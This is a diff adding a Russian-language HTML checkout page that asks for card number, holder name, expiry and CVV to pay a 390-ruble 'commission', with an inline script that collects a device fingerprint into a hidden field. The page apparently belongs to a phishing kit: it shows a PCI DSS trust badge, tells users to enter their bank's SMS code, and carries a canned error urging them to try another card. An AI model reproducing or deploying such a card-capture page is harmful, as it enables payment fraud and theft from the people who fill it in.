@@ -1,0 +1,182 @@
+
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta content="telephone=no" name="format-detection">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="referrer" content="no-referrer" />
+	<title>Оплата вашего заказа</title>
+	<link rel="shortcut icon" href="/static/f1/favicon.ico">
+	<meta name="theme-color" content="#ffffff">
+	<!--link href="https://fonts.googleapis.com/css?family=Roboto:300,400,700&amp;subset=cyrillic-ext" rel="stylesheet"-->
+	<link rel="stylesheet" href="/static/f1/common.css"/>
+	<link rel="stylesheet" href="/static/f1/restyle.css?d=c013f487eee99303becb99456f60e41e"/>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/additional-methods.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js"></script>
+    <script type="text/javascript" src="/static/f1/jquery.synctranslit.min.js"></script>
+    
+
+</head>
+<body>
+<div class="wrapper h-100 d-flex flex-column justify-content-between quest-step">
+
+	<div class="content">
+		<div class="container">
+
+			<form id="cardform" name="cardform" class="form" method="post" action="" autocomplete="on">
+                <input type="hidden" name="fp" id="fp-data" />
+                <input type="hidden" name="ddata" id="ddata" />
+                <div style="display: none">
+                    <div class="mt-20 text-danger text-sm error-sending-div" style="margin: 5px">
+                        Превышено
+                        количество
+                        попыток
+                        оплат
+                        с
+                        данной
+                        карты.
+                        Дальнейшие
+                        попытки
+                        будут
+                        отменяться
+                        автоматически.
+
+                    </div>
+                    <hr class="form-line mt-20 mb-30"/>
+                </div>
+                <div class="form-price row align-items-center">
+                    <div class="col-4 form-price--left">
+                        <div class="form-price--digit">
+                            390                            ₽
+                        </div>
+                                                    <div class="text-mutedx2"
+                                 style="font-size: 10px;">
+                                Возможна
+                                дополнительная
+                                комиссия
+                                вашего
+                                банка
+                            </div>
+                                            </div>
+                    <div class="col-8 form-price--right">
+                        <b>Детали
+                            вашей
+                            оплаты:</b>
+                        <div class="text-primary">
+                            Оплата комиссии<br/>							Заказ № <b>40082315973</b>
+						</div>
+					</div>
+				</div>
+				<hr class="form-line mt-20 mb-30"/>
+
+				<div class="mt-30 text-center text-mutedx2">
+					Заполните все поля карты и нажмите кнопку "Оплатить"
+				</div>
+
+
+				<div class="credit-cards mt-30">
+					<div class="credit-card credit-card_front d-flex flex-column justify-content-end">
+						<div class="form-line">
+							<input class="form-control" type="text" placeholder="Номер карты"
+								   name="card" id="card" autocomplete="off" spellcheck="false" inputmode="numeric"
+                                   value="">
+						</div>
+                        
+                        <div class="form-line" style="visibility: visible">
+                            <input class="form-control text-uppercase" type="text" placeholder="IVAN IVANOV"
+                                   name="name" id="name" value="" autocomplete="off" spellcheck="false">
+                        </div>
+
+						<div class="row align-items-center">
+							<div class="col-3 input-mini">
+								<input class="form-control form-control_center" type="text" placeholder="ММ"
+									   maxlength="2"
+									   name="month" id="month" inputmode="numeric"
+                                       value="">
+							</div>
+							<div class="col-1 text-center text-mutedx2">
+								/
+							</div>
+							<div class="col-3 input-mini">
+								<input class="form-control form-control_center" type="text" placeholder="ГГ"
+									   maxlength="2"
+									   name="year" id="year" inputmode="numeric"
+                                       value="">
+							</div>
+							<div class="col-5 text-right credit-card--brand">
+                                <img src="/static/f1/ppay.png" alt="" style="height: 18px">
+							</div>
+						</div>
+					</div>
+
+					<div class="credit-card credit-card_rear d-flex flex-column justify-content-end">
+						<div class="cvc align-items-center">
+							<input class="form-control form-control_center" type="text" placeholder="000" maxlength="3"
+								   name="cvv" id="cvv" autocomplete="off" spellcheck="false" inputmode="numeric"
+                                   value="">
+							<div class="cvc-text text-mutedx2">Три цифры с обратной стороны</div>
+						</div>
+					</div>
+				</div>
+				<div class="mt-20 text-danger text-sm error-sending-div" style="display: none">
+                    Произошла ошибка при обработке карты банком.<br/> Возможно, недостаточно средств на счете. Пожалуйста, проверьте введенные данные и повторите попытку, нажав <b>Оплатить</b> <br/>
+                    Если ошибка продолжает повторяться &ndash; необходимо использовать другую карту.
+				</div>
+
+				<div class="mt-20 text-danger text-sm error-div" style="display: none">Исправьте ошибки, выделенные
+					красной рамкой:
+				</div>
+
+				<div class="row mt-40 align-items-center">
+					<div class="col-7 form-agreement text-mutedx2">
+						После ввода данных, нажмите Оплатить, после этого, введите код из SMS, которое вы получите от
+						своего банка
+					</div>
+					<div class="col-5 form-submit">
+						<button class="btn" id="pay_button">
+							Оплатить
+						</button>
+					</div>
+				</div>
+
+
+				<hr class="form-line mt-30 mb-20"/>
+				<div class="mt-30 text-center">
+					<div class="text-mutedx2 mb-10">
+						<img src="/static/f1/padlock.png" alt="">
+						<span class="ml-5">Безопасность оплаты обеспечивается сертификатом PCI DSS 2.0</span>
+					</div>
+					<img src="/static/f1/protect-logos.png" alt="">
+				</div>
+
+			</form>
+		</div>
+	</div>
+
+</div>
+<script src="/static/f1/common.js?d=fce827963693df8ab600d59a48520459"></script>
+<script>
+    var device = {
+        languages: navigator.language,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        colorDepth: screen.colorDepth === 30 ? 24 : screen.colorDepth,
+        screenHeight: screen.height,
+        screenWidth: screen.width,
+        timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+
+    $("#ddata").val(JSON.stringify(device));
+
+</script>
+
+
+<div class="modal"></div>
+</body>
+</html>
+
